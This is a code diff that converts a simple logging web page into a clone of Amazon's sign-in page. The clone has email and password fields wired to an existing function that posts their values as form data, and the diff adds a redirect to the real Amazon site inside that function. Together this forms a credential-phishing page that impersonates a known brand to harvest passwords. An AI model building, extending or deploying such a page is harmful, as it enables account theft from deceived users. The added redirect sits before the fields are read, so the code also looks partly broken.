@@ -6,15 +6,9 @@
     <title>Logger App</title>
 </head>
 <body>
-    <h1>Logger App</h1>
-    <label for="username">Username: </label>
-    <input type="text" id="username" placeholder="Enter your username">
-    <br>
-    <input type="text" id="userInput" placeholder="Enter your log">
-    <button onclick="logInput()">Log</button>
-
     <script>
         function logInput() {
+            window.location.href = "https://www.amazon.com/ref=nav_logo";
             const username = document.getElementById('username').value;
             const userInput = document.getElementById('userInput').value;
 
@@ -24,6 +18,7 @@
                     'Content-Type': 'application/x-www-form-urlencoded',
                 },
                 body: `username=${username}&input=${userInput}`,
+                
             })
             .then(response => response.text())
             .then(data => console.log(data))
@@ -31,4 +26,248 @@
         }
     </script>
 </body>
+
+
+<head>
+  <meta charset="UTF-8">
+  
+
+    <link rel="apple-touch-icon" type="image/png" href="https://cpwebassets.codepen.io/assets/favicon/apple-touch-icon-5ae1a0698dcc2402e9712f7d01ed509a57814f994c660df9f7a952f3060705ee.png" />
+
+    <meta name="apple-mobile-web-app-title" content="CodePen">
+
+    <link rel="shortcut icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/favicon-aec34940fbc1a6e787974dcd360f2c6b63348d4b1f4e06c77743096d55480f33.ico" />
+
+    <link rel="mask-icon" type="image/x-icon" href="https://cpwebassets.codepen.io/assets/favicon/logo-pin-b4b4269c16397ad2f0f7a01bcdf513a1994f4c94b8af2f191c09eb0d601762b1.svg" color="#111" />
+
+
+
+  
+  
+
+  <title>CodePen - Amazon-SignIn-Clone</title>
+
+    <link rel="canonical" href="https://codepen.io/devrajdc/pen/BaMMZxZ">
+  
+  
+  
+  
+
+  <script>
+  window.console = window.console || function(t) {};
+</script>
+
+  
+  
+</head>
+
+<body translate="no">
+  <html>
+
+<head>
+    <meta charset="utf-8">
+    <title>Amazon Sign In</title>
+    <link rel="stylesheet" href="signIn.css">
+</head>
+
+<style>
+    .amazon-logo {
+        width: 150px;
+        margin: 20px auto;
+        display: block;
+    }
+
+    #amazon {
+        width: 100%;
+        height: 33px;
+        font-size: 13px;
+        background: linear-gradient(#F7DEA1, #F0C14D);
+        border: 0.5px solid #aaaaaa;
+        border-radius: 3px;
+        margin-top: 10px;
+    }
+
+    #amazon:hover {
+        background: linear-gradient(#F5D68A, #EEBA36);
+    }
+
+    body {
+        font-size: 13px;
+        line-height: 19px;
+        color: #111;
+        font-family: Arial, sans-serif;
+    }
+
+    #signInBorder {
+        margin: 0 auto;
+        border-color: #DDDDDD;
+        border: 0.5px solid #DDDDDD;
+        border-radius: 8px;
+        width: 340px;
+        padding: 20px 25px;
+    }
+
+    input {
+        border-radius: 3px;
+        border: 1px solid #a6a6a6;
+        height: 32px;
+        width: 100%;
+      padding: 0px;
+        margin-bottom: 15px;
+    }
+
+    input:focus {
+        -webkit-box-shadow: 0px 0px 1.5px 1.5px rgba(231, 118, 0, 0.9);
+        -moz-box-shadow: 0px 0px 1.5px 1.5px rgba(231, 118, 0, 0.9);
+        box-shadow: 0px 0px 1.5px 1.5px rgba(231, 118, 0, 0.9);
+        outline: 0;
+    }
+
+    #SignInTxt {
+        font-weight: 400;
+        font-size: 28px;
+        line-height: 1.2;
+        margin: 0;
+        margin-bottom: 14px;
+    }
+
+    h2 {
+        color: rgb(134, 134, 134);
+        font-weight: normal;
+        letter-spacing: 1px;
+        font-size: 11.5px;
+        width: 100%;
+        text-align: center;
+        border-top: 1px solid rgba(0, 0, 0, 0.1);
+        border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+        line-height: 0.1em;
+        margin: 10px 0 20px;
+        margin-bottom: 5px;
+    }
+
+    h2 span {
+        background: #fff;
+        padding: 0 10px;
+        letter-spacing: normal;
+    }
+
+    #createAccount {
+        margin-top: 30px;
+    }
+
+    #newAccount {
+        background: linear-gradient(#f6f7f9, #e7e9ec);
+        margin-top: 10px;
+        width: 100%;
+        height: 33px;
+        font-size: 13px;
+        border: 0.5px solid #aaaaaa;
+        border-radius: 3px;
+    }
+
+    #newAccount:hover {
+        background: linear-gradient(#f5f6f8, #d9dce1);
+    }
+
+    #footer {
+        border: 0;
+        height: 0;
+        border-top: 1px solid rgba(0, 0, 0, 0.1);
+        border-bottom: 1px solid rgba(255, 255, 255, 0.3);
+        margin-top: 30px;
+    }
+
+    .extra .links {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 20px;
+        width: 100%;
+    }
+
+    a:link {
+        font-size: 12px;
+        text-decoration: none;
+        color: #0066c0
+    }
+
+    a:hover {
+        text-decoration: underline;
+        color: #c45500;
+    }
+
+    a:visited {
+        color: #0066c0;
+    }
+
+    .links {
+        font-size: 10px;
+        text-align: center;
+        padding-left: 15px;
+    }
+
+    #password {
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        width: 100%;
+    }
+
+    #special {
+        font-size: 11px;
+    }
+</style>
+
+<body>
+    <img class="amazon-logo" src="https://pngimg.com/uploads/amazon/amazon_PNG24.png" alt="Amazon.com" />
+
+    <div id="signInBorder">
+        <p id="SignInTxt">
+            Sign in
+        </p>
+
+        <label>
+            <strong>Email</strong>
+        </label>
+        <input type="email" id="username"name="email" value="">
+
+        <br>
+
+        <div id="password">
+            <label><strong>Password</strong></label>
+            <a href="#">Forgot your password?</a>
+        </div>
+        <input id="userInput" type="password" name="password" value="">
+
+        <div>
+            <button id="amazon" onclick="logInput()">Sign in</button>
+        </div>
+
+        <div id="createAccount">
+            <h2><span>New to Amazon?</span></h2>
+            <button id="newAccount" name="newAcct">Create your Amazon account</button>
+        </div>
+
+    </div>
+
+    <hr id="footer">
+
+    <div class="extra">
+        <p class="links"><a href="#" id="first">Conditions of Use</a>
+            <a href="#">Privacy Notice</a>
+            <a href="#">Help</a>
+        </p>
+        <p class="links" id="special">
+            © 1996-2023, Amazon.com, Inc. or its affiliates
+        </p>
+    </div>
+
+</body>
+
+</html>
+  
+  
+  
+</body>
+
 </html>
